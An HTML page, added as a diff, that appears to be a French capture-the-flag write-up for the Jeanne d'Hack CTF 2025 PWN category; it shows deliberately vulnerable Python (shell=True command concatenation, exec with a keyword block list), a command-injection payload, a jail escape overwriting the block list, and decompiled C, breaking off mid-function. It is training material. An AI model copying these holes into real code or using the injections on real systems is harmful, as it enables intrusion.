@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+  <head>
+    <meta charset="utf-8">
+    <script type="text/javascript">
+      
+      if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
+        window.location.href = 'https://' + window.location.host + window.location.pathname + window.location.search;
+      }
+    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Writeup PWN - Edition 2025 | </title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="Dans cet article, nous vous présenterons les différentes solutions aux challenges du Jeanne d&rsquo;Hack CTF 2025
+pour la catégorie PWN.
+
+Echo Service
+PyJail
+Fear My Thoughts
+Special Value
+
+Echo Service
+Les sources du challenge sont disponibles ici.
+
+Énoncé
+Vous avez été embauché comme pirate informatique dans un monde dystopique où les technologies avancées ont créé une société
+divisée entre les riches et les pauvres. Un de vos objectifs est d&rsquo;accéder à la puissance de l&rsquo;élite en exploitant un logiciel
+python vulnérable qui se trouve sur un serveur distant.">
+    <meta name="generator" content="Hugo 0.143.1">
+    
+    
+    
+      <meta name="robots" content="index, follow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.d0769c6e76ec01cc50a9b248214d5ae29247d2966cf3fe5c6a470ed0e8edd3a3.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="https://jeanned-hack-ctf.github.io/writeups/2025/pwn/">
+    
+
+    <meta property="og:url" content="https://jeanned-hack-ctf.github.io/writeups/2025/pwn/">
+  <meta property="og:title" content="Writeup PWN - Edition 2025">
+  <meta property="og:description" content="Dans cet article, nous vous présenterons les différentes solutions aux challenges du Jeanne d’Hack CTF 2025 pour la catégorie PWN.
+Echo Service PyJail Fear My Thoughts Special Value Echo Service Les sources du challenge sont disponibles ici.
+Énoncé
+Vous avez été embauché comme pirate informatique dans un monde dystopique où les technologies avancées ont créé une société divisée entre les riches et les pauvres. Un de vos objectifs est d’accéder à la puissance de l’élite en exploitant un logiciel python vulnérable qui se trouve sur un serveur distant.">
+  <meta property="og:locale" content="fr_FR">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-03-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-08T00:00:00+00:00">
+
+  <meta itemprop="name" content="Writeup PWN - Edition 2025">
+  <meta itemprop="description" content="Dans cet article, nous vous présenterons les différentes solutions aux challenges du Jeanne d’Hack CTF 2025 pour la catégorie PWN.
+Echo Service PyJail Fear My Thoughts Special Value Echo Service Les sources du challenge sont disponibles ici.
+Énoncé
+Vous avez été embauché comme pirate informatique dans un monde dystopique où les technologies avancées ont créé une société divisée entre les riches et les pauvres. Un de vos objectifs est d’accéder à la puissance de l’élite en exploitant un logiciel python vulnérable qui se trouve sur un serveur distant.">
+  <meta itemprop="datePublished" content="2025-03-08T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-03-08T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2590">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup PWN - Edition 2025">
+  <meta name="twitter:description" content="Dans cet article, nous vous présenterons les différentes solutions aux challenges du Jeanne d’Hack CTF 2025 pour la catégorie PWN.
+Echo Service PyJail Fear My Thoughts Special Value Echo Service Les sources du challenge sont disponibles ici.
+Énoncé
+Vous avez été embauché comme pirate informatique dans un monde dystopique où les technologies avancées ont créé une société divisée entre les riches et les pauvres. Un de vos objectifs est d’accéder à la puissance de l’élite en exploitant un logiciel python vulnérable qui se trouve sur un serveur distant.">
+
+      
+    
+
+    
+
+    
+    
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    },
+    loader:{
+      load: ['ui/safe']
+    },
+  };
+</script>
+
+    
+  </head><body class="ma0 avenir bg-near-white production">
+
+    
+   
+  
+
+  
+  
+  <header class="contain bg-center bg-black" style="background-image: url('https://jeanned-hack-ctf.github.io/images/background.svg');">
+    
+    <div class="bg-black-10">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        <img src="/images/logo.svg" class="w100 mw5-ns" alt="" />
+      
+    </a>
+    <div id="dropdown-list" class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+            
+              <li class="list f5 f4-ns fw4 dib pr3">
+                <a class="hover-white no-underline white-90" href="/inscriptions/" title="Inscriptions page">
+                  Inscriptions
+                </a>
+              </li>
+            
+          
+            
+              <li class="list f5 f4-ns fw4 dib has-dropdown pr3">
+                <a class="hover-white no-underline white-90" href="/post/" title="Editions Précedentes page">
+                  Editions Précedentes
+                </a>
+                <ul class="dropdown">
+                  
+                    <li class="f5 f4-ns fw4 dib pr3">
+                      <a class="hover-white no-underline white-90" href="/post/2024/" title="Edition 2024 page">
+                        Edition 2024
+                      </a>
+                    </li>
+                  
+                    <li class="f5 f4-ns fw4 dib pr3">
+                      <a class="hover-white no-underline white-90" href="/post/2025/" title="Edition 2025 page">
+                        Edition 2025
+                      </a>
+                    </li>
+                  
+                </ul>
+              </li>
+            
+          
+            
+              <li class="list f5 f4-ns fw4 dib has-dropdown pr3">
+                <a class="hover-white no-underline white-90" href="/writeups/" title="Write-Ups page">
+                  Write-Ups
+                </a>
+                <ul class="dropdown">
+                  
+                    <li class="f5 f4-ns fw4 dib pr3">
+                      <a class="hover-white no-underline white-90" href="/writeups/2025/" title="Write-ups 2025 page">
+                        Write-ups 2025
+                      </a>
+                    </li>
+                  
+                    <li class="f5 f4-ns fw4 dib pr3">
+                      <a class="hover-white no-underline white-90" href="/writeups/2026/" title="Write-ups 2026 page">
+                        Write-ups 2026
+                      </a>
+                    </li>
+                  
+                </ul>
+              </li>
+            
+          
+        </ul>
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv4 pv6-l ph3 ph4-ns">
+      </div>
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Write-ups 2025
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">Writeup PWN - Edition 2025</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2025-03-08T00:00:00Z">mars 8, 2025</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l"><p>Dans cet article, nous vous présenterons les différentes solutions aux challenges du Jeanne d&rsquo;Hack CTF 2025
+pour la catégorie <a href="https://github.com/JeanneD-Hack-CTF/JeanneD-Hack-CTF-2025/tree/main/pwn">PWN</a>.</p>
+<ul>
+<li><a href="#echo-service">Echo Service</a></li>
+<li><a href="#pyjail">PyJail</a></li>
+<li><a href="#fear-my-thoughts">Fear My Thoughts</a></li>
+<li><a href="#special-value">Special Value</a></li>
+</ul>
+<h2 id="echo-service">Echo Service</h2>
+<p>Les sources du challenge sont disponibles <a href="https://github.com/JeanneD-Hack-CTF/JeanneD-Hack-CTF-2025/blob/main/pwn/Echo_Service">ici</a>.</p>
+<blockquote>
+<p><strong>Énoncé</strong></p>
+<p>Vous avez été embauché comme pirate informatique dans un monde dystopique où les technologies avancées ont créé une société
+divisée entre les riches et les pauvres. Un de vos objectifs est d&rsquo;accéder à la puissance de l&rsquo;élite en exploitant un logiciel
+python vulnérable qui se trouve sur un serveur distant.</p>
+<p>Vous avez réussi à récupèrer une copie du programme en question (echo.py).</p>
+<p>Avec l&rsquo;aide de vos connaissances en hacking, vous devrez utiliser tous les moyens à votre disposition pour remplir votre
+mission et détrôner le gouvernement oppressif qui a longtemps régné sur cette dystopie. Nous sommes dans une bataille
+entre l&rsquo;ordre et la révolution, et il ne peut y avoir qu&rsquo;un vainqueur. Allez-y, pirate, libérez les esprits et faites
+progresser la liberté dans ce monde cyberpunk.</p>
+<p>Pour vous connecter au service distant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netcat 127.0.0.1 <span style="color:#ae81ff">9000</span>
+</span></span></code></pre></div><p>Le flag est contenu dans le fichier flag.txt.</p></blockquote>
+<p>Pour ce premier challenge, on nous fournit le programme Python suivant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>BANNER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> _____     _             _____                 _          
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  ___|   | |           /  ___|               (_)         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |__  ___| |__   ___   \ `--.  ___ _ ____   ___  ___ ___ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  __|/ __| &#39;_ \ / _ \   `--. \/ _ \ &#39;__\ \ / / |/ __/ _ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |__| (__| | | | (_) | /\__/ /  __/ |   \ V /| | (_|  __/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\____/\___|_| |_|\___/  \____/ \___|_|    \_/ |_|\___\___|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>      print(BANNER)
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#39;Enter something:&#39;</span>)
+</span></span><span style="display:flex;"><span>      arg <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>      command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#34;</span> <span style="color:#f92672">+</span> arg
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output(command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#39;You entered:&#39;</span>, result<span style="color:#f92672">.</span>decode(), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#39;Bye&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#39;O_o something went wrong!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Le programme lit une entrée utilisateur via la fonction <code>input</code>, la concatène à la chaîne &ldquo;echo &quot; avant de la passer en
+paramètre de la fonction <code>check_output</code> du module <code>subprocess</code>. Si l&rsquo;on exécute le programme en entrant
+&ldquo;Hello World&rdquo;, on obtient ceci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Enter something:
+</span></span><span style="display:flex;"><span>&gt; Hello World
+</span></span><span style="display:flex;"><span>You entered: Hello World
+</span></span><span style="display:flex;"><span>Bye
+</span></span></code></pre></div><p>Jusque-là, rien d&rsquo;extraordinaire. Cependant, si l&rsquo;on examine le paramètre supplémentaire de <code>check_output</code>, à savoir <code>shell=True</code>,
+et que l&rsquo;on consulte la documentation associée, on peut lire <a href="https://docs.python.org/3/library/subprocess.html#security-considerations">ici</a> :</p>
+<blockquote>
+<p>Security Considerations</p>
+<p>Unlike some other popen functions, this library will not implicitly choose to call a system shell. This means
+that all characters, including shell metacharacters, can safely be passed to child processes. If the shell is
+invoked explicitly, via shell=True, it is the application’s responsibility to ensure that all whitespace and
+metacharacters are quoted appropriately to avoid shell injection vulnerabilities. On some platforms, it is
+possible to use shlex.quote() for this escaping.</p></blockquote>
+<p>Cela implique que les caractères saisis dans la console seront interprétés par <code>check_output</code>. En conséquence, le programme
+est exposé à une vulnérabilité d&rsquo;injection de commande. Il est possible d&rsquo;afficher le contenu du fichier <code>flag.txt</code>
+de la manière suivante :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Enter something:
+</span></span><span style="display:flex;"><span>&gt; Hello World; cat flag.txt
+</span></span><span style="display:flex;"><span>You entered: Hello World
+</span></span><span style="display:flex;"><span>JDHACK<span style="color:#f92672">{</span>ECHo_S3RviCE_Ha5_F@lleN<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>Bye
+</span></span></code></pre></div><p>On obtient le flag <code>JDHACK{ECHo_S3RviCE_Ha5_F@lleN}</code>.</p>
+<h2 id="pyjail">PyJail</h2>
+<p>Les sources du challenge sont disponibles <a href="https://github.com/JeanneD-Hack-CTF/JeanneD-Hack-CTF-2025/blob/main/pwn/PyJail">ici</a>.</p>
+<blockquote>
+<p><strong>Énoncé</strong></p>
+<p>Après avoir réussi à compromettre le processus vulnérable Python, vous avez pu prendre le contrôle du
+système et accéder aux ressources les plus précieuses de la société. Cependant, ce n&rsquo;est pas tout : le
+programme qui a été compromis est uniquement une partie de la plateforme centrale des opérations.</p>
+<p>Vous avez appris que l&rsquo;existence d&rsquo;un second logiciel, encore plus difficile à infiltrer, se trouve
+dans le cœur du réseau des opérations de contrôle. Vous devrez donc utiliser tous les moyens à votre disposition
+pour trouver une faiblesse dans ce programme.</p>
+<p>Vous avez réussi à récupèrer une copie du programme en question (jail.py).</p>
+<p>Allez-y, pirate, nous devons gagner cette bataille pour la liberté et le progrès de tous les citoyens de ce monde.</p>
+<p>Pour vous connecter au service distant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netcat 127.0.0.1 <span style="color:#ae81ff">9002</span>
+</span></span></code></pre></div><p>Le flag est contenu dans le fichier flag.txt.</p></blockquote>
+<p>Pour ce second challenge, on retrouve une nouvelle fois un programme écrit en Python contenant le code suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>BANNER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__________            ____.      .__.__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\______   \___.__.   |    |____  |__|  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |     ___&lt;   |  |   |    \__  \ |  |  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |    |    \___  /\__|    |/ __ \|  |  |__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |____|    / ____\________(____  /__|____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           \/                  \/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>banned <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;import&#34;</span>, <span style="color:#e6db74">&#34;os&#34;</span>, <span style="color:#e6db74">&#34;sys&#34;</span>, <span style="color:#e6db74">&#34;system&#34;</span>, <span style="color:#e6db74">&#34;subprocess&#34;</span>, <span style="color:#e6db74">&#34;pty&#34;</span>, <span style="color:#e6db74">&#34;open&#34;</span>, <span style="color:#e6db74">&#34;popen&#34;</span>, <span style="color:#e6db74">&#34;read&#34;</span> ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    print(BANNER)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Write the code you want to test after:&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> keyword <span style="color:#f92672">in</span> banned:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> keyword <span style="color:#f92672">in</span> code:
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;WARNING: Escape detected!!!! Shuting down connection!&#34;</span>)
+</span></span><span style="display:flex;"><span>                    exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            exec(code, {<span style="color:#e6db74">&#39;globals&#39;</span>: globals()})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;O_o something went wrong!&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(e)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>La fonction <code>exec</code> de permet d&rsquo;exécuter du code Python dynamiquement. On pourrait donc lire le fichier <code>flag.txt</code> via l&rsquo;entrée
+suivante : <code>print(open('flag.txt', 'r').read())</code>. Cependant, lorsque l&rsquo;on essaie cela sur le challenge, on obtient
+la sortie suivante :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Write the code you want to test after:
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; print<span style="color:#f92672">(</span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>WARNING: Escape detected!!!! Shuting down connection!
+</span></span></code></pre></div><p>En effet, le programme filtre l&rsquo;entrée utilisateur avant de l&rsquo;envoyer à la fonction <code>exec</code>. Si l&rsquo;on veut pouvoir afficher
+le flag, il faut que notre entrée ne contienne pas d&rsquo;occurrences d&rsquo;un élément dans <code>banned</code>.</p>
+<p>Cependant, on a accès au <code>globals</code> (second paramètre de la fonction <code>exec</code>), ce qui permet de rendre visibles les variables
+globales ainsi que les modules. Il est donc possible d&rsquo;écraser le tableau <code>banned</code> afin d&rsquo;exécuter le code que l&rsquo;on souhaite :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>Write the code you want to test after:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> globals[<span style="color:#e6db74">&#39;banned&#39;</span>]<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>JDHACK{HOw_d1d_Y0U_3ScApE_th<span style="color:#960050;background-color:#1e0010">!</span>S_JA1L}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> exit()
+</span></span></code></pre></div><p>On obtient ainsi notre flag <code>JDHACK{HOw_d1d_Y0U_3ScApE_th!S_JA1L}</code>.</p>
+<h2 id="fear-my-thoughts">Fear My Thoughts</h2>
+<p>Les sources du challenge sont disponibles <a href="https://github.com/JeanneD-Hack-CTF/JeanneD-Hack-CTF-2025/blob/main/pwn/Fear_My_Thoughts">ici</a>.</p>
+<blockquote>
+<p><strong>Énoncé</strong></p>
+<p>Dans cette période sombre, vous avez découvert un programme mystérieux qui s&rsquo;active régulièrement sur les ordinateurs des citoyens.
+Le programme affiche simplement une phrase sur l&rsquo;écran : My thoughts are messy and strange, can you read them?</p>
+<p>Il est difficile de savoir ce que fait ce programme et pourquoi il s&rsquo;active régulièrement. Cependant, vous avez découvert que certaines
+personnes qui ont été en contact avec le logiciel ont commencé à parler en rêve et à avoir des visions étranges et inquiétantes.</p>
+<p>Ce programme est dangereux, mais aussi énigmatique : pourquoi les créateurs ont-ils choisi de le faire afficher simplement avec cette
+phrase ? Pourquoi les pensées des citoyens sont-elles si importantes ? Il semble qu&rsquo;il y ait un mystère encore plus profond à dévoiler.
+Allez-y, pirate, vous devrez utiliser tous vos talents de hacker pour déchiffrer ce mystère et sauver l&rsquo;esprit des citoyens.</p>
+<p>Vous avez réussi à récupèrer une copie du programme (fear_my_thoughts).</p>
+<p>Pour vous connecter au service distant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netcat 127.0.0.1 <span style="color:#ae81ff">9001</span>
+</span></span></code></pre></div></blockquote>
+<p>Ce challenge est le premier de sa catégorie à se présenter sous la forme d&rsquo;un fichier exécutable plutôt que
+d&rsquo;un programme écrit en Python. Par conséquent, il est nécessaire d&rsquo;utiliser un logiciel de rétro-ingénierie
+tel que Ghidra pour l&rsquo;analyser. Le programme inclut des symboles, ce qui facilite son analyse. La fonction
+<code>main</code> se présente sous le pseudo-code suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> user_input [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> thoughts [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create_thoughts</span>(thoughts);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,banner);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;My thoughts are messy and strange, can you read them?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(user_input,<span style="color:#ae81ff">0x20</span>,stdin);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_thoughts</span>(thoughts,user_input);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You make me pity. I give you one last chance</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(user_input,<span style="color:#ae81ff">0x20</span>,stdin);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_thoughts</span>(thoughts,user_input);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Too bad!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Le programme commence par appeler la fonction <code>create_thoughts</code>, puis il appelle deux fois la fonction <code>read_thoughts</code>.
+La première fonction contient le code suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">create_thoughts</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>thoughts) {
+</span></span><span style="display:flex;"><span>  byte random_bytes [<span style="color:#ae81ff">40</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">!=</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fread</span>(random_bytes,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">1</span>,fp);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> random_bytes[i] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      thoughts[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JQCkK1ZAgVROjaWSvcYhw3XD0bMLlrUENytP7psTBo6umFfzdq2nx4iHeG9I58&#34;</span>
+</span></span><span style="display:flex;"><span>        [(uint)random_bytes[i] <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        (uint)(byte)((ushort)(((ushort)c <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> (ushort)c) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> (ushort)c) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3e</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    thoughts[<span style="color:#ae81ff">31</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Le calcul qui peut sembler complexe est en réalité lié à une optimisation de l&rsquo;opération modulo effectuée
+par le compilateur. Même sans saisir ce détail, il est facile de comprendre le rôle de cette fonction : elle remplit
+le paramètre <code>thoughts</code> avec une chaîne alphabétique aléatoire à chaque exécution du programme.</p>
+<p>Examinons maintenant la fonction <code>read_thoughts</code>, qui contient le code suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_thoughts</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>thoughts,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user_input) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer [<span style="color:#ae81ff">72</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(user_input);
